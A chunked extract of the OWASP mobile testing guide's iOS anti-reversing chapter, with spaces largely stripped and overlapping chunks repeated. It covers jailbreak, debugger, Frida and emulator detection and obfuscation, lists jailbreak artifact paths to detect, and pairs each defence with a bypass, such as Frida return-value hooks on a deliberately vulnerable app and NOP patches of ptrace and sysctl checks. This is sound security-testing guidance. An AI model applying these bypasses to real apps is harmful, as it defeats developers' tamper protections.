#iosinfobinary Name Type Encrypted PIE ARC Canary StackExec RootSafe --- masvs_category:MASVS-RESILIENCE platform:ios --- #iOSAnti-ReversingDefenses ##Overview Thischaptercoversdefense-in-depthmeasuresrecommendedforappsthatprocess,orgiveaccessto,sensitivedataorfunctionality.Researchshows that[many ↪ AppStoreappsoftenincludethesemeasures](https://seredynski.com/articles/a-security-review-of-1-300-appstore-applications \"Asecurityreviewof1,300 ↪ AppStoreapplications-5April2020\"). Thesemeasuresshouldbeappliedasneeded,basedonanassessmentoftheriskscausedbyunauthorizedtamperingwiththe appand/orreverseengineeringofthe ↪ code. -Appsmustneverusethesemeasuresasareplacementforsecuritycontrols,andarethereforeexpectedtofulfillother baselinesecuritymeasuressuchasthe ↪ restoftheMASVSsecuritycontrols. -Appsshouldcombinethesemeasurescleverlyinsteadofusingthemindividually.Thegoalistodiscouragereverseengineersfrom performingfurtheranalysis. -Integratingsomeofthecontrolsintoyourappmightincreasethecomplexityofyourappandevenhavean impactonitsperformance. YoucanlearnmoreaboutprinciplesandtechnicalrisksofreverseengineeringandcodemodificationintheseOWASPdocuments: -[OWASPArchitecturalPrinciplesThatPreventCodeModificationorReverse ↪ Engineering](https://wiki.owasp.org/index.php/OWASP_Reverse_Engineering_and_Code_Modification_Prevention_Project \"OWASPArchitecturalPrinciplesThat ↪ PreventCodeModificationorReverseEngineering\") -[OWASPTechnicalRisksofReverseEngineeringandUnauthorizedCode ↪ Modification](https://wiki.owasp.org/index.php/Technical_Risks_of_Reverse_Engineering_and_Unauthorized_Code_Modification \"OWASPTechnicalRisksofReverse ↪ EngineeringandUnauthorizedCodeModification\") ###GeneralDisclaimer The**lackofanyofthesemeasuresdoesnotcauseavulnerability**-instead,theyaremeanttoincreasetheapp'sresilienceagainstreverseengineeringand ↪ specificclient-sideattacks. Noneofthesemeasurescanassurea100%effectiveness,asthereverseengineerwillalwayshavefullaccesstothe deviceandwillthereforealwayswin(given ↪ enoughtimeandresources)! Forexample,preventingdebuggingisvirtuallyimpossible.Iftheappispubliclyavailable,itcanberunonanuntrusted devicethatisunderfullcontrolof ↪ theattacker.Averydeterminedattackerwilleventuallymanagetobypassalltheapp'santi-debugging controlsbypatchingtheappbinaryorbydynamically ↪ modifyingtheapp'sbehavioratruntimewithtoolssuchasFrida. ###JailbreakDetection Jailbreakdetectionmechanismsareaddedtoreverseengineeringdefensetomakerunningtheapponajailbrokendevicemoredifficult. Thisblockssomeofthe ↪ toolsandtechniquesreverseengineersliketouse.Likemostothertypesofdefense,jailbreakdetectionisnotveryeffective byitself,butscattering ↪ checksthroughouttheapp'ssourcecodecanimprovetheeffectivenessoftheoverallanti-tamperingscheme. >YoucanlearnmoreaboutJailbreak/RootDetectionintheresearchstudy [\"Jailbreak/RootDetectionEvasionStudyoniOSand ↪ Android\"](https://github.com/crazykid95/Backup-Mobile-Security-Report/blob/master/Jailbreak-Root-Detection-Evasion-Study-on-iOS-and-Android.pdf ↪ \"Jailbreak/RootDetectionEvasionStudyoniOSandAndroid\")byDanaGeistandMaratNigmatullin. ####CommonJailbreakDetectionChecks Herewepresentthreetypicaljailbreakdetectiontechniques: **File-basedChecks:** Theappmightbecheckingforfilesanddirectoriestypicallyassociatedwithjailbreaks,suchas: ```default /Applications/Cydia.app /Applications/FakeCarrier.app /Applications/Icy.app /Applications/IntelliScreen.app /Applications/MxTube.app /Applications/RockApp.app /Applications/SBSettings.app /Applications/WinterBoard.app /Applications/blackra1n.app 506\\n/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist /Library/MobileSubstrate/DynamicLibraries/Veency.plist /Library/MobileSubstrate/MobileSubstrate.dylib /System/Library/LaunchDaemons/com.ikey.bbot.plist /System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist /bin/bash /bin/sh /etc/apt /etc/ssh/sshd_config /private/var/lib/apt /private/var/lib/cydia /private/var/mobile/Library/SBSettings/Themes /private/var/stash /private/var/tmp/cydia.log /var/tmp/cydia.log /usr/bin/sshd /usr/libexec/sftp-server /usr/libexec/ssh-keysign /usr/sbin/sshd /var/cache/apt /var/lib/apt /var/lib/cydia /usr/sbin/frida-server /usr/bin/cycript /usr/local/bin/cycript /usr/lib/libcycript.dylib /var/log/syslog CheckingFilePermissions: Theappmightbetryingtowritetoalocationthat’soutsidetheapplication’ssandbox. Forinstance,itmayattemptto createafilein,forexample,the/privatedirectory. Ifthefileiscreatedsuccessfully,theappcanassumethatthedevice hasbeenjailbroken. do{ letpathToFileInRestrictedDirectory =\"/private/jailbreak.txt\" try\"Thisisatest.\".write(toFile:pathToFileInRestrictedDirectory,atomically:true,encoding:String.Encoding.utf8) tryFileManager.default.removeItem(atPath:pathToFileInRestrictedDirectory) //Deviceisjailbroken }catch { //Deviceisnotjailbroken } CheckingProtocolHandlers: Theappmightbeattemptingtocallwell-knownprotocolhandlerssuchascydia://(availablebydefaultafterinstalling Cydia). ifleturl=URL(string:\"cydia://package/com.example.package\"),UIApplication.shared.canOpenURL(url){ //Deviceisjailbroken } Automated Jailbreak Detection Bypass ThequickestwaytobypasscommonJailbreakdetectionmechanismsisobjection. Youcanfindtheimplementationofthe jailbreakbypassinthejailbreak.tsscript. Manual Jailbreak Detection Bypass Iftheautomatedbypassesaren’teffectiveyouneedtogetyourhandsdirtyandreverseengineertheappbinariesuntil youfindthepiecesofcoderesponsibleforthedetectionandeitherpatchthemstaticallyorapplyruntimehookstodisable them. Step1: ReverseEngineering: Whenyouneedtoreverseengineerabinarylookingforjailbreakdetection,themostobviouswayistosearchforknown strings,suchas“jail”or“jailbreak”. Notethatthiswon’tbealwayseffective,especiallywhenresiliencemeasuresarein placeorsimplywhenthethedeveloperhasavoidedsuchobviousterms. Example: DownloadtheDamnVulnerableiOSapplication(DVIA-v2),unzipit,loadthemainbinaryintoradare2andwait fortheanalysistocomplete. 507\\nr2-A./DVIA-v2-swift/Payload/DVIA-v2.app/DVIA-v2 Nowyoucanlistthebinary’ssymbolsusingtheiscommandandapplyacase-insensitivegrep(~+)forthestring“jail”. [0x1001a9790]>is~+jail ... 2230 0x001949a80x1001949a8GLOBALFUNC0 DVIA_v2.JailbreakDetectionViewController.isJailbroken.allocator__Bool 7792 0x0016d2d80x10016d2d8LOCAL FUNC0 +[JailbreakDetectionisJailbroken] ... Asyoucansee,there’saninstancemethodwiththesignature-[JailbreakDetectionVC isJailbroken]. Step2: DynamicHooks: NowyoucanuseFridatobypassjailbreakdetectionbyperformingtheso-calledearlyinstrumentation,thatis,byreplacing functionimplementationrightatstartup. Usefrida-traceonyourhostcomputer: frida-trace -U-f/Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp -m\"-[JailbreakDetectionVCisJailbroken]\" This will start the app, trace calls to -[JailbreakDetectionVC isJailbroken], and create a JavaScript hook for each matchingelement. Open./__handlers__/__JailbreakDetectionVC_isJailbroken_.jswithyourfavouritteeditorand edit the onLeave callback function. You can simply replace the return value using retval.replace() to always return 0: onLeave:function (log,retval,state){ console.log(\"Function[JailbreakDetectionVCisJailbroken]originallyreturned:\"+retval); retval.replace(0); console.log(\"Changingthereturnvalueto:\"+retval); } Thiswillprovidethefollowingoutput: $frida-trace -U-f/Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp -m\"-[JailbreakDetectionVCisJailbroken]:\" Instrumentingfunctions... `... -[JailbreakDetectionVCisJailbroken]:Loadedhandlerat \"./__handlers__/__JailbreakDetectionVC_isJailbroken_.js\" Startedtracing1function.PressCtrl+Ctostop. Function[JailbreakDetectionVCisJailbroken]originallyreturned:0x1 Changingthereturnvalueto:0x0 Anti-Debugging Detection Exploringapplicationsusingadebuggerisaverypowerfultechniqueduringreversing. Youcannotonlytrackvariables containingsensitivedataandmodifythecontrolflowoftheapplication,butalsoreadandmodifymemoryandregisters. There are several anti-debugging techniques applicable to iOS which can be categorized as preventive or as reactive. When properly distributed throughout the app, these techniques act as a supportive measure to increase the overall resilience. • Preventivetechniquesactasafirstlineofdefensetoimpedethedebuggerfromattachingtotheapplicationatall. • Reactivetechniquesallowtheapplicationtodetectthepresenceofadebuggerandhaveachancetodivergefrom normalbehavior. Using ptrace Asseeninchapter“TamperingandReverseEngineeringoniOS”,theiOSXNUkernelimplementsaptracesystemcall that’s lacking most of the functionality required to properly",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 163
    }
  },
  {
    "text": "several anti-debugging techniques applicable to iOS which can be categorized as preventive or as reactive. When properly distributed throughout the app, these techniques act as a supportive measure to increase the overall resilience. • Preventivetechniquesactasafirstlineofdefensetoimpedethedebuggerfromattachingtotheapplicationatall. • Reactivetechniquesallowtheapplicationtodetectthepresenceofadebuggerandhaveachancetodivergefrom normalbehavior. Using ptrace Asseeninchapter“TamperingandReverseEngineeringoniOS”,theiOSXNUkernelimplementsaptracesystemcall that’s lacking most of the functionality required to properly debug a process (e.g. it allows attaching/stepping but not read/writeofmemoryandregisters). Nevertheless,theiOSimplementationoftheptracesyscallcontainsanonstandardandveryusefulfeature: preventing thedebuggingofprocesses. ThisfeatureisimplementedasthePT_DENY_ATTACHrequest,asdescribedintheofficialBSD SystemCallsManual. Insimplewords,itensuresthatnootherdebuggercanattachtothecallingprocess;ifadebugger attemptstoattach, the processwillterminate. UsingPT_DENY_ATTACH isafairly well-knownanti-debuggingtechnique, soyoumayencounteritoftenduringiOSpentests. 508\\nBeforedivingintothedetails,itisimportanttoknowthatptraceisnotpartofthepubliciOSAPI.Non-publicAPIs areprohibited,andtheAppStoremayrejectappsthatincludethem. Becauseofthis,ptraceisnotdirectlycalled inthecode;it’scalledwhenaptracefunctionpointerisobtainedviadlsym. Thefollowingisanexampleimplementationoftheabovelogic: #import <dlfcn.h> #import <sys/types.h> #import <stdio.h> typedef int(*ptrace_ptr_t)(int_request,pid_t_pid,caddr_t_addr,int_data); void anti_debug(){ ptrace_ptr_tptrace_ptr =(ptrace_ptr_t)dlsym(RTLD_SELF,\"ptrace\"); ptrace_ptr(31,0,0,0);//PTRACE_DENY_ATTACH=31 } Bypass: Todemonstratehowtobypassthistechniquewe’lluseanexampleofadisassembledbinarythatimplements thisapproach: Let’sbreakdownwhat’shappeninginthebinary. dlsymiscalledwithptraceasthesecondargument(registerR1). The return value in register R0 is moved to register R6 at offset 0x1908A. At offset 0x19098, the pointer value in register R6 is called using the BLX R6 instruction. To disable the ptrace call, we need to replace the instruction BLX R6 (0xB0 0x47inLittleEndian)withtheNOP(0x00 0xBFinLittleEndian)instruction. Afterpatching,thecodewillbesimilartothe following: Armconverter.comisahandytoolforconversionbetweenbytecodeandinstructionmnemonics. Bypassesforotherptrace-basedanti-debuggingtechniquescanbefoundin“DefeatingAnti-DebugTechniques: macOS ptracevariants”byAlexanderO’Mara. Using sysctl Anotherapproachtodetectingadebuggerthat’sattachedtothecallingprocessinvolvessysctl. AccordingtotheApple documentation,itallowsprocessestosetsysteminformation(ifhavingtheappropriateprivileges)orsimplytoretrieve systeminformation(suchaswhetherornottheprocessisbeingdebugged). However,notethatjustthefactthatanapp usessysctlmightbeanindicatorofanti-debuggingcontrols,thoughthiswon’tbealwaysbethecase. TheAppleDocumentationArchiveincludesanexamplewhichcheckstheinfo.kp_proc.p_flagflagreturnedbythecall tosysctlwiththeappropriateparameters. AccordingtoApple,youshouldn’tusethiscodeunlessit’sforthedebug buildofyourprogram. 509\\nBypass: Onewaytobypassthischeckisbypatchingthebinary. Whenthecodeaboveiscompiled,thedisassembled versionofthesecondhalfofthecodeissimilartothefollowing: Aftertheinstructionatoffset0xC13C,MOVNE R0, #1ispatchedandchangedtoMOVNE R0, #0(0x000x20ininbytecode), thepatchedcodeissimilartothefollowing: You can also bypass a sysctl check by using the debugger itself and setting a breakpoint at the call to sysctl. This approachisdemonstratediniOSAnti-DebuggingProtections#2. Using getppid Applications on iOS can detect if they have been started by a debugger by checking their parent PID. Normally, an applicationisstartedbythelaunchdprocess,whichisthefirstprocessrunningintheusermodeandhasPID=1. However, ifadebuggerstartsanapplication,wecanobservethatgetppidreturnsaPIDdifferentthan1. Thisdetectiontechnique canbeimplementedinnativecode(viasyscalls),usingObjective-CorSwiftasshownhere: 510\\nfuncAmIBeingDebugged()->Bool{ returngetppid()!=1 } Bypass: Similarly to the other techniques, this has also a trivial bypass (e.g. by patching the binary or by using Frida hooks). File Integrity Checks Therearetwocommonapproachestocheckfileintegrity: usingapplicationsourcecodeintegritychecksandusingfile storageintegritychecks. Application Source Code Integrity Checks Inthe“TamperingandReverseEngineeringoniOS”chapter,wediscussedtheiOSIPAapplicationsignaturecheck. Wealso sawthatdeterminedreverseengineerscanbypassthischeckbyre-packagingandre-signinganappusingadeveloper orenterprisecertificate. Onewaytomakethisharderistoaddacustomcheckthatdetermineswhetherthesignatures stillmatchatruntime. AppletakescareofintegritycheckswithDRM.However,additionalcontrols(suchasintheexamplebelow)arepossible. Themach_headerisparsedtocalculatethestartoftheinstructiondata,whichisusedtogeneratethesignature. Next, thesignatureiscomparedtothegivensignature. Makesurethatthegeneratedsignatureisstoredorcodedsomewhere else. intxyz(char *dst){ const struct mach_header *header; Dl_infodlinfo; if(dladdr(xyz,&dlinfo)==0||dlinfo.dli_fbase ==NULL){ NSLog(@\"Error:Couldnotresolvesymbolxyz\"); [NSThreadexit]; } while(1){ header =dlinfo.dli_fbase; //PointerontheMach-Oheader struct load_command *cmd=(struct load_command *)(header +1);//Firstloadcommand //Nowiteratethroughloadcommand //tofind__textsectionof__TEXTsegment for(uint32_t i=0;cmd!=NULL && i<header->ncmds;i++){ if(cmd->cmd==LC_SEGMENT){ //__TEXTloadcommandisaLC_SEGMENTloadcommand struct segment_command *segment =(struct segment_command *)cmd; if(!strcmp(segment->segname,\"__TEXT\")){ //Stopon__TEXTsegmentloadcommandandgothroughsections //tofind__textsection struct section *section =(struct section *)(segment +1); for(uint32_t j=0;section !=NULL && j<segment->nsects;j++){ if(!strcmp(section->sectname,\"__text\")) break;//Stopon__textsectionloadcommand section =(struct section *)(section +1); } //Getherethe__textsectionaddress,the__textsectionsize //andthevirtualmemoryaddresssowecancalculate //apointeronthe__textsection uint32_t *textSectionAddr =(uint32_t *)section->addr; uint32_t textSectionSize =section->size; uint32_t *vmaddr =segment->vmaddr; char *textSectionPtr =(char *)((int)header +(int)textSectionAddr -(int)vmaddr); //Calculatethesignatureofthedata, //storetheresultinastring //andcomparetotheoriginalone unsigned char digest[CC_MD5_DIGEST_LENGTH]; CC_MD5(textSectionPtr,textSectionSize,digest); //calculatethesignature for(inti=0;i<sizeof(digest);i++) //fillsignature sprintf(dst+(2*i),\"%02x\",digest[i]); //returnstrcmp(originalSignature,signature)==0; //verifysignaturesmatch return 0; } } cmd=(struct load_command *)((uint8_t *)cmd+cmd->cmdsize); } } } 511\\nBypass: 1. Patchtheanti-debuggingfunctionalityanddisabletheunwantedbehaviorbyoverwritingtheassociatedcodewith NOPinstructions. 2. Patchanystoredhashthat’susedtoevaluatetheintegrityofthecode. 3. UseFridatohookfilesystemAPIsandreturnahandletotheoriginalfileinsteadofthemodifiedfile. File Storage Integrity Checks Apps might choose to ensure the integrity of the application storage itself, by creating an HMAC or signature over ei- ther a given key-value pair or a file stored on the device, e.g. in the Keychain, UserDefaults/NSUserDefaults, or any database. Forexample,anappmightcontainthefollowingcodetogenerateanHMACwithCommonCrypto: //Allocateabuffertoholdthedigestandperformthedigest. NSMutableData*actualData =[getData]; //getthekeyfromthekeychain NSData*key=[getKey]; NSMutableData*digestBuffer =[NSMutableDatadataWithLength:CC_SHA256_DIGEST_LENGTH]; CCHmac(kCCHmacAlgSHA256,[actualDatabytes],(CC_LONG)[keylength],[actualDatabytes],(CC_LONG)[actualDatalength],[digestBuffermutableBytes]); [actualDataappendData:digestBuffer]; Thisscriptperformsthefollowingsteps: 1. GetthedataasNSMutableData. 2. Getthedatakey(typicallyfromtheKeychain). 3. Calculatethehashvalue. 4. Appendthehashvaluetotheactualdata. 5. Storetheresultsofstep4. Afterthat,itmightbeverifyingtheHMACsbydoingthefollowing: NSData*hmac =[datasubdataWithRange:NSMakeRange(data.length -CC_SHA256_DIGEST_LENGTH,CC_SHA256_DIGEST_LENGTH)]; NSData*actualData =[datasubdataWithRange:NSMakeRange(0,(data.length -hmac.length))]; NSMutableData*digestBuffer =[NSMutableDatadataWithLength:CC_SHA256_DIGEST_LENGTH]; CCHmac(kCCHmacAlgSHA256,[actualDatabytes],(CC_LONG)[keylength],[actualDatabytes],(CC_LONG)[actualDatalength],[digestBuffermutableBytes]); return [hmacisEqual:digestBuffer]; 1. ExtractsthemessageandthehmacbytesasseparateNSData. 2. Repeatssteps1-3oftheprocedureforgeneratinganHMAContheNSData. 3. ComparestheextractedHMACbytestotheresultofstep1. Note: iftheappalsoencryptsfiles,makesurethatitencryptsandthencalculatestheHMACasdescribedinAuthenticated Encryption. Bypass: 1. Retrievethedatafromthedevice,asdescribedinthe“DeviceBinding”section. 2. Altertheretrieveddataandreturnittostorage. Reverse Engineering Tools Detection Thepresenceoftools, frameworksandappscommonlyusedbyreverseengineersmayindicateanattempttoreverse engineer the app. Some of these tools can only run on a jailbroken device, while others force the app into debugging modeordependonstartingabackgroundserviceonthemobilephone. Therefore,therearedifferentwaysthatanapp mayimplementtodetectareverseengineeringattackandreacttoit,e.g.byterminatingitself.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 164
    }
  },
  {
    "text": "-hmac.length))]; NSMutableData*digestBuffer =[NSMutableDatadataWithLength:CC_SHA256_DIGEST_LENGTH]; CCHmac(kCCHmacAlgSHA256,[actualDatabytes],(CC_LONG)[keylength],[actualDatabytes],(CC_LONG)[actualDatalength],[digestBuffermutableBytes]); return [hmacisEqual:digestBuffer]; 1. ExtractsthemessageandthehmacbytesasseparateNSData. 2. Repeatssteps1-3oftheprocedureforgeneratinganHMAContheNSData. 3. ComparestheextractedHMACbytestotheresultofstep1. Note: iftheappalsoencryptsfiles,makesurethatitencryptsandthencalculatestheHMACasdescribedinAuthenticated Encryption. Bypass: 1. Retrievethedatafromthedevice,asdescribedinthe“DeviceBinding”section. 2. Altertheretrieveddataandreturnittostorage. Reverse Engineering Tools Detection Thepresenceoftools, frameworksandappscommonlyusedbyreverseengineersmayindicateanattempttoreverse engineer the app. Some of these tools can only run on a jailbroken device, while others force the app into debugging modeordependonstartingabackgroundserviceonthemobilephone. Therefore,therearedifferentwaysthatanapp mayimplementtodetectareverseengineeringattackandreacttoit,e.g.byterminatingitself. Youcandetectpopularreverseengineeringtoolsthathavebeeninstalledinanunmodifiedformbylookingforassociated applicationpackages,files,processes,orothertool-specificmodificationsandartifacts. Inthefollowingexamples,we’ll discussdifferentwaystodetecttheFridainstrumentationframework,whichisusedextensivelyinthisguideandalsoin therealworld. Othertools,suchasCydiaSubstrateorCycript,canbedetectedsimilarly. Notethatinjection,hookingand DBI(DynamicBinaryInstrumentation)toolscanoftenbedetectedimplicitly,throughruntimeintegritychecks,whichare discussedbelow. 512\\nBypass: Thefollowingstepsshouldguideyouwhenbypassingdetectionofreverseengineeringtools: 1. Patch the anti reverse engineering functionality. Disable the unwanted behavior by patching the binary through usageofradare2/iaitoorGhidra. 2. UseFridaorCydiaSubstratetohookfilesystemAPIsontheObjective-C/Swiftornativelayers. Returnahandleto theoriginalfile,notthemodifiedfile. Refertothechapter“TamperingandReverseEngineeringoniOS”forexamplesofpatchingandcodeinjection. Frida Detection Fridarunsunderthenameoffrida-serverinitsdefaultconfiguration(injectedmode)onajailbrokendevice. Whenyou explicitlyattachtoatargetapp(e.g.viafrida-traceortheFridaCLI),Fridainjectsafrida-agentintothememoryofthe app. Therefore, you may expect to find it there after attaching to the app (and not before). On Android, verifying this isprettystraightforwardasyoucansimplygrepforthestring“frida”inthememorymapsoftheprocessIDintheproc directory(/proc/<pid>/maps). However,oniOStheprocdirectoryisnotavailable,butyoucanlisttheloadeddynamic librariesinanappwiththefunction_dyld_image_count. Fridamayalsorunintheso-calledembeddedmode,whichalsoworksfornon-jailbrokendevices. Itconsistsofembedding afrida-gadgetintotheIPAandforcingtheapptoloaditasoneofitsnativelibraries. The application’s static content, including its ARM-compiled binary and its external libraries, is stored inside the <Application>.app directory. If you inspect the content of the /var/containers/Bundle/Application/<UUID>/ <Application>.appdirectory,you’llfindtheembeddedfrida-gadgetasFridaGadget.dylib. iPhone:/var/containers/Bundle/Application/AC5DC1FD-3420-42F3-8CB5-E9D77C4B287A/SwiftSecurity.app/Frameworksroot#ls -alh total87M drwxr-xr-x10_installd_installd 320Nov1906:08./ drwxr-xr-x11_installd_installd 352Nov1906:08../ -rw-r--r-- 1_installd_installd 70MNov1606:37FridaGadget.dylib -rw-r--r-- 1_installd_installd3.8MNov1606:37libswiftCore.dylib -rw-r--r-- 1_installd_installd 71KNov1606:37libswiftCoreFoundation.dylib -rw-r--r-- 1_installd_installd136KNov1606:38libswiftCoreGraphics.dylib -rw-r--r-- 1_installd_installd 99KNov1606:37libswiftDarwin.dylib -rw-r--r-- 1_installd_installd189KNov1606:37libswiftDispatch.dylib -rw-r--r-- 1_installd_installd1.9MNov1606:38libswiftFoundation.dylib -rw-r--r-- 1_installd_installd 76KNov1606:37libswiftObjectiveC.dylib LookingatthesetracesthatFridaleavesbehind,youmightalreadyimaginethatdetectingFridawouldbeatrivialtask. Andwhileitistrivialtodetecttheselibraries,itisequallytrivialtobypasssuchadetection. Detectionoftoolsisacat andmousegameandthingscangetmuchmorecomplicated. Thefollowingtableshortlypresentsasetofsometypical Fridadetectionmethodsandashortdiscussionontheireffectiveness. SomeofthefollowingdetectionmethodsareimplementedintheiOSSecuritySuite. 513\\nMethod Description Discussion CheckTheEnvironmentFor Artifactscanbepackagedfiles, Inspectingrunningservicesisnot RelatedArtifacts binaries,libraries,processes,and possibleforaniOSappona temporaryfiles. ForFrida,thiscould non-jailbrokendevice. TheSwift bethefrida-serverrunninginthe methodCommandLineisnot target(jailbroken)system(the availableoniOStoqueryfor daemonresponsibleforexposing informationaboutrunningprocesses, FridaoverTCP)orthefridalibraries butthereareunofficialways,suchas loadedbytheapp. byusingNSTask. Neverthelesswhen usingthismethod,theappwillbe rejectedduringtheAppStorereview process. ThereisnootherpublicAPI availabletoqueryforrunning processesorexecutesystem commandswithinaniOSApp. Evenif itwouldbepossible,bypassingthis wouldbeaseasyasjustrenamingthe correspondingFridaartifact (frida-server/frida-gadget/frida-agent). AnotherwaytodetectFrida,wouldbe towalkthroughthelistofloaded librariesandcheckforsuspicious ones(e.g.thoseincluding“frida”in theirnames),whichcanbedoneby using_dyld_get_image_name. CheckingForOpenTCPPorts Thefrida-serverprocessbindstoTCP Thismethoddetectsfrida-serverinits port27042bydefault. Testing defaultmode,butthelisteningport whetherthisportisopenisanother canbechangedviaacommandline methodofdetectingthedaemon. argument,sobypassingthisisvery trivial. CheckingForPortsResponding frida-serverusestheD-Bus Thisisafairlyrobustmethodof ToD-BusAuth protocoltocommunicate,soyoucan detectingfrida-server,butFrida expectittorespondtoD-BusAUTH. offersalternativemodesofoperation SendaD-BusAUTHmessagetoevery thatdon’trequirefrida-server. openportandcheckforananswer, hopingthatfrida-serverwillreveal itself. Pleaserememberthatthistableisfarfromexhaustive. Forexample,twootherpossibledetectionmechanismsare: • namedpipes(usedbyfrida-serverforexternalcommunication),or • detectingtrampolines(see“PreventbypassingofSSLcertificatepinninginiOSapplications”forfurtherexplanation andsamplecodefordetectionoftrampolinesinaniOSapp) Both would help to detect Substrate or Frida’s Interceptor but, for example, won’t be effective against Frida’s Stalker. Rememberthatthesuccessofeachofthesedetectionmethodswilldependonwhetheryou’reusingajailbrokendevice, thespecificversionofthejailbreakandmethodand/ortheversionofthetoolitself. Attheend,thisispartofthecatand mousegameofprotectingdatabeingprocessedonanuncontrolledenvironment(theenduser’sdevice). Emulator Detection The goal of emulator detection is to increase the difficulty of running the app on an emulated device. This forces the reverse engineer to defeat the emulator checks or utilize the physical device, thereby barring the access required for large-scaledeviceanalysis. 514\\nAsdiscussedinthesectionTestingontheiOSSimulatorinthebasicsecuritytestingchapter,theonlyavailablesimulator istheonethatshipswithXcode. Simulatorbinariesarecompiledtox86codeinsteadofARMcodeandappscompiled forarealdevice(ARMarchitecture)don’truninthesimulator,hencesimulationprotectionwasnotsomuchaconcern regardingiOSappsincontrasttoAndroidwithawiderangeofemulationchoicesavailable. However, since its release, Corellium (commercial tool) has enabled real emulation, setting itself apart from the iOS simulator. Inadditiontothat,beingaSaaSsolution,Corelliumenableslarge-scaledeviceanalysiswiththelimitingfactor justbeingavailablefunds. WithAppleSilicon(ARM)hardwarewidelyavailable,traditionalchecksforthepresenceofx86/x64architecturemight notsuffice. Onepotentialdetectionstrategyistoidentifyfeaturesandlimitationsavailableforcommonlyusedemulation solutions. For instance, Corellium doesn’t support iCloud, cellular services, camera, NFC, Bluetooth, App Store access or GPU hardware emulation (Metal). Therefore, smartly combining checks involving any of these features could be an indicatorforthepresenceofanemulatedenvironment. Pairingtheseresultswiththeonesfrom3rdpartyframeworkssuchasiOSSecuritySuite,Trusteerorano-codesolution suchasAppdome(commercialsolution)willprovideagoodlineofdefenseagainstattacksutilizingemulators. Obfuscation Thechapter“MobileAppTamperingandReverseEngineering”introducesseveralwell-knownobfuscationtechniquesthat canbeusedinmobileappsingeneral. Name Obfuscation Thestandardcompilergeneratesbinarysymbolsbasedonclassandfunctionnamesfromthesourcecode. Therefore,if noobfuscationwasapplied,symbolnamesremainmeaningfulandcanbeeasilyreadstraightfromtheappbinary. For instance, afunctionwhichdetectsajailbreakcanbelocatedbysearchingforrelevantkeywords(e.g.“jailbreak”). The listingbelowshowsthedisassembledfunctionJailbreakDetectionViewController.jailbreakTest4Tappedfromthe DamnVulnerableiOSApp(DVIA-v2). __T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Aftertheobfuscationwecanobservethatthesymbol’snameisnolongermeaningfulasshownonthelistingbelow. __T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Nevertheless,thisonlyappliestothenamesoffunctions,classesandfields. Theactualcoderemainsunmodified,soan attackercanstillreadthedisassembledversionofthefunctionandtrytounderstanditspurpose(e.g.toretrievethelogic ofasecurityalgorithm). Instruction Substitution This technique replaces standard binary operators like addition or subtraction with more complex representations. For exampleanadditionx = a + bcanberepresentedasx = -(-a) - (-b). However, usingthesamereplacementrepre- sentation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introducearandomfactor. Thistechniqueisvulnerabletodeobfuscation,butdependingonthecomplexityanddepthof thesubstitutions,applyingitcanstillbetimeconsuming. Control Flow Flattening Controlflowflatteningreplacesoriginalcodewithamorecomplexrepresentation. Thetransformationbreaksthebodyof afunctionintobasicblocksandputsthemallinsideasingleinfiniteloopwithaswitchstatementthatcontrolstheprogram flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs thatusuallymakethecodeeasiertoread. Theimageshowshowcontrolflowflatteningalterscode. See“ObfuscatingC++programsviacontrolflowflattening”for moreinformation. 515\\nDead Code Injection Thistechniquemakestheprogram’scontrolflowmorecomplexbyinjectingdeadcodeintotheprogram. Deadcodeisa stubofcodethatdoesn’taffecttheoriginalprogram’sbehaviourbutincreasestheoverheadforthereverseengineering process. String Encryption Applications are often compiled with hardcoded keys, licences,",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 165
    }
  },
  {
    "text": "single case and introducearandomfactor. Thistechniqueisvulnerabletodeobfuscation,butdependingonthecomplexityanddepthof thesubstitutions,applyingitcanstillbetimeconsuming. Control Flow Flattening Controlflowflatteningreplacesoriginalcodewithamorecomplexrepresentation. Thetransformationbreaksthebodyof afunctionintobasicblocksandputsthemallinsideasingleinfiniteloopwithaswitchstatementthatcontrolstheprogram flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs thatusuallymakethecodeeasiertoread. Theimageshowshowcontrolflowflatteningalterscode. See“ObfuscatingC++programsviacontrolflowflattening”for moreinformation. 515\\nDead Code Injection Thistechniquemakestheprogram’scontrolflowmorecomplexbyinjectingdeadcodeintotheprogram. Deadcodeisa stubofcodethatdoesn’taffecttheoriginalprogram’sbehaviourbutincreasestheoverheadforthereverseengineering process. String Encryption Applications are often compiled with hardcoded keys, licences, tokens and endpoint URLs. By default, all of them are storedinplaintextinthedatasectionofanapplication’sbinary. Thistechniqueencryptsthesevaluesandinjectsstubs ofcodeintotheprogramthatwilldecryptthatdatabeforeitisusedbytheprogram. Recommended Tools • SwiftShieldcanbeusedtoperformnameobfuscation. ItreadsthesourcecodeoftheXcodeprojectandreplaces allnamesofclasses,methodsandfieldswithrandomvaluesbeforethecompilerisused. • obfuscator-llvm operates on the Intermediate Representation (IR) instead of the source code. It can be used for symbolobfuscation,stringencryptionandcontrolflowflattening. Sinceit’sbasedonIR,itcanhideoutsignificantly moreinformationabouttheapplicationascomparedtoSwiftShield. LearnmoreaboutiOSobfuscationtechniquesinthepaper“ProtectingMillion-UseriOSAppswithObfuscation: Motivations, Pitfalls,andExperience”. Device Binding The purpose of device binding is to impede an attackerwho tries to copy an app and its state fromdevice A to device B and continue the execution of the app on device B. After device A has been determined trusted, it may have more privilegesthandeviceB.Thissituationshouldn’tchangewhenanappiscopiedfromdeviceAtodeviceB. SinceiOS7.0,hardwareidentifiers(suchasMACaddresses)areoff-limitsbutthereareothermethodsforimplementing devicebindinginiOS: • identifierForVendor: You can use [[UIDevice currentDevice] identifierForVendor] (in Objective- C), UIDevice.current.identifierForVendor?.uuidString (in Swift3), or UIDevice.currentDevice(). identifierForVendor?.UUIDString(inSwift2). ThevalueofidentifierForVendormaynotbethesameifyou reinstall the app 